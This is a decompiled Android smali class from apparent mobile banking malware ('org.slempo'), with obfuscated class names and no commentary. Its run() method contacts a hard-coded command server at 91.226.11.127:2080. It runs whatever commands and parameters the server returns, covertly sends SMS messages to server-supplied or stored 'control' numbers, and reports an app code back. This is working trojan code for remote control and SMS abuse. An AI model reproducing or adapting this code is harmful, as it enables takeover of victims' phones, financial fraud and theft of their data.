.class Lorg/slempo/service/utils/reijdskmcx$1;
.super Ljava/lang/Object;
.source "reijdskmcx.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/utils/reijdskmcx;->startSending()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/slempo/service/utils/reijdskmcx;


# direct methods
.method constructor <init>(Lorg/slempo/service/utils/reijdskmcx;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    .line 49
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 13

    .prologue
    .line 53
    const/4 v7, 0x0

    .line 55
    .local v7, "updateUIIntent":Landroid/content/Intent;
    :try_start_0
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    iget-object v10, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v10}, Lorg/slempo/service/utils/reijdskmcx;->access$1(Lorg/slempo/service/utils/reijdskmcx;)Landroid/content/Context;

    move-result-object v10

    .line 56
    const-string v11, "http://91.226.11.127:2080/"

    iget-object v12, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v12}, Lorg/slempo/service/utils/reijdskmcx;->access$2(Lorg/slempo/service/utils/reijdskmcx;)Ljava/lang/String;

    move-result-object v12

    .line 55
    invoke-static {v9, v10, v11, v12}, Lorg/slempo/service/utils/reijdskmcx;->access$3(Lorg/slempo/service/utils/reijdskmcx;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;

    move-result-object v6

    .line 57
    .local v6, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v9

    invoke-interface {v9}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v9

    const/16 v10, 0xc8

    if-eq v9, v10, :cond_2

    .line 58
    new-instance v9, Ljava/lang/Exception;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "Status code "

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 59
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v11

    invoke-interface {v11}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 60
    const-string v11, " "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 61
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v11

    invoke-static {v11}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 58
    invoke-direct {v9, v10}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    throw v9
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 92
    .end local v6    # "response":Lorg/apache/http/HttpResponse;
    :catch_0
    move-exception v2

    move-object v8, v7

    .line 93
    .end local v7    # "updateUIIntent":Landroid/content/Intent;
    .local v2, "e":Ljava/lang/Exception;
    .local v8, "updateUIIntent":Landroid/content/Intent;
    :goto_0
    :try_start_1
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$0(Lorg/slempo/service/utils/reijdskmcx;)Z

    move-result v9

    if-eqz v9, :cond_7

    .line 94
    new-instance v7, Landroid/content/Intent;

    const-string v9, "UPDATE_MAIN_UI"

    invoke-direct {v7, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 95
    .end local v8    # "updateUIIntent":Landroid/content/Intent;
    .restart local v7    # "updateUIIntent":Landroid/content/Intent;
    :try_start_2
    const-string v9, "status"

    const/4 v10, 0x0

    invoke-virtual {v7, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 97
    :goto_1
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$4(Lorg/slempo/service/utils/reijdskmcx;)Lorg/slempo/service/utils/reijdskmcx$RequestType;

    move-result-object v9

    sget-object v10, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_INITIAL_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    if-eq v9, v10, :cond_0

    .line 98
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$4(Lorg/slempo/service/utils/reijdskmcx;)Lorg/slempo/service/utils/reijdskmcx$RequestType;

    move-result-object v9

    sget-object v10, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONTROL_NUMBER_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    if-eq v9, v10, :cond_0

    .line 99
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$4(Lorg/slempo/service/utils/reijdskmcx;)Lorg/slempo/service/utils/reijdskmcx$RequestType;

    move-result-object v9

    sget-object v10, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CHECK_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    if-eq v9, v10, :cond_0

    .line 100
    invoke-static {}, Lorg/slempo/service/utils/reijdskmcx;->access$5()Landroid/content/SharedPreferences;

    move-result-object v9

    .line 101
    const-string v10, "CONTROL_NUMBER"

    const-string v11, ""

    .line 100
    invoke-interface {v9, v10, v11}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 101
    iget-object v10, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v10}, Lorg/slempo/service/utils/reijdskmcx;->access$2(Lorg/slempo/service/utils/reijdskmcx;)Ljava/lang/String;

    move-result-object v10

    .line 100
    invoke-static {v9, v10}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->sendMessage(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 104
    :cond_0
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$0(Lorg/slempo/service/utils/reijdskmcx;)Z

    move-result v9

    if-eqz v9, :cond_1

    .line 105
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$1(Lorg/slempo/service/utils/reijdskmcx;)Landroid/content/Context;

    move-result-object v9

    invoke-virtual {v9, v7}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 108
    .end local v2    # "e":Ljava/lang/Exception;
    :cond_1
    :goto_2
    return-void

    .line 63
    .restart local v6    # "response":Lorg/apache/http/HttpResponse;
    :cond_2
    :try_start_3
    new-instance v3, Lorg/json/JSONObject;

    .line 64
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v9

    invoke-static {v9}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;)Ljava/lang/String;

    move-result-object v9

    .line 63
    invoke-direct {v3, v9}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 65
    .local v3, "jObject":Lorg/json/JSONObject;
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$0(Lorg/slempo/service/utils/reijdskmcx;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 66
    new-instance v8, Landroid/content/Intent;

    const-string v9, "UPDATE_MAIN_UI"

    invoke-direct {v8, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 67
    .end local v7    # "updateUIIntent":Landroid/content/Intent;
    .restart local v8    # "updateUIIntent":Landroid/content/Intent;
    :try_start_4
    const-string v9, "status"

    const/4 v10, 0x1

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    move-object v7, v8

    .line 104
    .end local v8    # "updateUIIntent":Landroid/content/Intent;
    .restart local v7    # "updateUIIntent":Landroid/content/Intent;
    :cond_3
    :goto_3
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$0(Lorg/slempo/service/utils/reijdskmcx;)Z

    move-result v9

    if-eqz v9, :cond_1

    .line 105
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$1(Lorg/slempo/service/utils/reijdskmcx;)Landroid/content/Context;

    move-result-object v9

    invoke-virtual {v9, v7}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    goto :goto_2

    .line 68
    :cond_4
    :try_start_5
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$4(Lorg/slempo/service/utils/reijdskmcx;)Lorg/slempo/service/utils/reijdskmcx$RequestType;

    move-result-object v9

    sget-object v10, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CHECK_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-ne v9, v10, :cond_5

    .line 70
    :try_start_6
    const-string v9, "command"

    invoke-virtual {v3, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 71
    .local v1, "command":Ljava/lang/String;
    new-instance v5, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;

    .line 73
    const-string v9, "params"

    invoke-virtual {v3, v9}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v9

    .line 74
    invoke-virtual {v9}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v9

    iget-object v10, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v10}, Lorg/slempo/service/utils/reijdskmcx;->access$1(Lorg/slempo/service/utils/reijdskmcx;)Landroid/content/Context;

    move-result-object v10

    .line 71
    invoke-direct {v5, v1, v9, v10}, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;-><init>(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 75
    .local v5, "processor":Lorg/slempo/service/utils/IUHJMNYTHGBVSD;
    invoke-virtual {v5}, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;->processCommand()Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_3

    .line 76
    .end local v1    # "command":Ljava/lang/String;
    .end local v5    # "processor":Lorg/slempo/service/utils/IUHJMNYTHGBVSD;
    :catch_1
    move-exception v9

    goto :goto_3

    .line 78
    :cond_5
    :try_start_7
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$4(Lorg/slempo/service/utils/reijdskmcx;)Lorg/slempo/service/utils/reijdskmcx$RequestType;

    move-result-object v9

    sget-object v10, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_INITIAL_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    if-ne v9, v10, :cond_3

    .line 80
    :try_start_8
    const-string v9, "number"

    invoke-virtual {v3, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 81
    .local v4, "number":Ljava/lang/String;
    const-string v9, "code"

    invoke-virtual {v3, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 82
    .local v0, "code":Ljava/lang/String;
    invoke-static {v4, v0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->sendMessage(Ljava/lang/String;Ljava/lang/String;)Z

    .line 83
    invoke-static {}, Lorg/slempo/service/utils/reijdskmcx;->access$5()Landroid/content/SharedPreferences;

    move-result-object v9

    .line 84
    const-string v10, "INITIAL_DATA_IS_SENT"

    const/4 v11, 0x1

    .line 83
    invoke-static {v9, v10, v11}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 85
    invoke-static {}, Lorg/slempo/service/utils/reijdskmcx;->access$5()Landroid/content/SharedPreferences;

    move-result-object v9

    .line 86
    const-string v10, "APP_ID"

    .line 85
    invoke-static {v9, v10, v0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 87
    iget-object v9, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v9}, Lorg/slempo/service/utils/reijdskmcx;->access$1(Lorg/slempo/service/utils/reijdskmcx;)Landroid/content/Context;

    move-result-object v9

    invoke-static {v9, v0}, Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;->sendAppCodeData(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto :goto_3

    .line 88
    .end local v0    # "code":Ljava/lang/String;
    .end local v4    # "number":Ljava/lang/String;
    :catch_2
    move-exception v9

    goto :goto_3

    .line 103
    .end local v3    # "jObject":Lorg/json/JSONObject;
    .end local v6    # "response":Lorg/apache/http/HttpResponse;
    :catchall_0
    move-exception v9

    .line 104
    :goto_4
    iget-object v10, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v10}, Lorg/slempo/service/utils/reijdskmcx;->access$0(Lorg/slempo/service/utils/reijdskmcx;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 105
    iget-object v10, p0, Lorg/slempo/service/utils/reijdskmcx$1;->this$0:Lorg/slempo/service/utils/reijdskmcx;

    invoke-static {v10}, Lorg/slempo/service/utils/reijdskmcx;->access$1(Lorg/slempo/service/utils/reijdskmcx;)Landroid/content/Context;

    move-result-object v10

    invoke-virtual {v10, v7}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 107
    :cond_6
    throw v9

    .line 103
    .end local v7    # "updateUIIntent":Landroid/content/Intent;
    .restart local v8    # "updateUIIntent":Landroid/content/Intent;
    :catchall_1
    move-exception v9

    move-object v7, v8

    .end local v8    # "updateUIIntent":Landroid/content/Intent;
    .restart local v7    # "updateUIIntent":Landroid/content/Intent;
    goto :goto_4

    .line 92
    .end local v7    # "updateUIIntent":Landroid/content/Intent;
    .restart local v3    # "jObject":Lorg/json/JSONObject;
    .restart local v6    # "response":Lorg/apache/http/HttpResponse;
    .restart local v8    # "updateUIIntent":Landroid/content/Intent;
    :catch_3
    move-exception v2

    goto/16 :goto_0

    .end local v3    # "jObject":Lorg/json/JSONObject;
    .end local v6    # "response":Lorg/apache/http/HttpResponse;
    .restart local v2    # "e":Ljava/lang/Exception;
    :cond_7
    move-object v7, v8

    .end local v8    # "updateUIIntent":Landroid/content/Intent;
    .restart local v7    # "updateUIIntent":Landroid/content/Intent;
    goto/16 :goto_1
.end method
